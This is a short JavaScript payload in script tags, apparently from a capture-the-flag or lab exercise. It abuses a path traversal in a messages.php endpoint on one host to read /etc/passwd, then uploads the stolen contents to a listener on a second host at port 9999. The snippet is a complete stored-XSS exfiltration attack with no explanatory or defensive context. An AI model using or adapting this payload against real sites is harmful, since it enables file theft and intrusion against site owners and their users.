<script>

fetch('http://10.10.11.44/messages.php?file=../../../../etc/passwd')
    .then(response => {
        if (!response.ok) {
            throw new Error(`Failed to fetch resource: ${response.statusText}`);
        }
        return response.text(); // Process the response as text
    })
    .then(data => {
        // Prepare to forward the data
        const formData = new FormData();
        formData.append('file', new Blob([data], { type: 'text/plain' }), 'messages-data.txt');

        // Forward the data to the second address
        return fetch('http://10.10.14.7:9999/messages-data.txt', {
            method: 'POST',
            body: formData,
        });
    })

</script>
